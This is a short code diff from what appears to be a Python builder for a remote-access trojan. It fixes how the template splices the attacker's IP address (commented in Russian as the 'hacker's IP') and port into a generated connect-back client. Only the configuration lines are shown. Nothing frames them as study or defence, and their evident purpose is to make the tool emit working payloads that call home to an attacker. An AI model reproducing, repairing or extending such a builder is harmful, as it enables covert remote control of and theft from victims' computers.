@@ -347,8 +347,8 @@ queue = Queue()
 arrAddresses = []
 arrConnections = []
 
-strHost = '"""str(ipu)"""'   #ip хакера
-intPort = """str(ptu)"""
+strHost = '"""+str(ipu)+"""'   #ip хакера
+intPort = """+str(ptu)+"""
 
 intBuff = 1024
 decode_utf = lambda data: data.decode("utf-8")
